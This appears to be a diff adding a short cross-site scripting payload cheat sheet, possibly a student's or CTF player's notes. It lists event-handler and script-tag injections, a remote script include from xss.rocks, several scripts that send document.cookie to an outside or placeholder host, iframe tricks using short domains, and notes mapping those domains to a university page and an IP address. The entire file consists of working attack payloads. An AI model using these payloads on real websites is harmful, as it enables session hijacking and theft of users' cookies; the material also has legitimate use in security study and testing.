@@ -1,0 +1,24 @@
+<svg OnLoAd=alert(1)>
+#<svg OnLoAd=alert(1)>
+<svg/OnLoAd=alert(1)>
+<body onload=alert('test1')>
+<b onmouseover=alert('Wufff!')>click me!</b>
+<img src=x onerror=alert(document.cookie);>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+
+<script>alert(document.cookie);</script>
+"><script language= "JavaScript">document.location="http://yoursite.com/whateveryouwant.php?cookie=" + document.cookie;document.location="http://www.whateversite.com"</script>
+
+<script type="text/javascript">document.location="http://localhost:8080?c="+escape(document.cookie)</script>
+
+zxuU.tk -> https://www.csie.ntu.edu.tw/~r07922115/
+qvxz.ml -> 140.112.90.24
+
+<iframe SRc=/\qvxz.Ml>
+<iframe SRc=/\zxuU.tk>
+<iframe SRc=/\zxuU.Ml>
+
+
+&sol; -> /
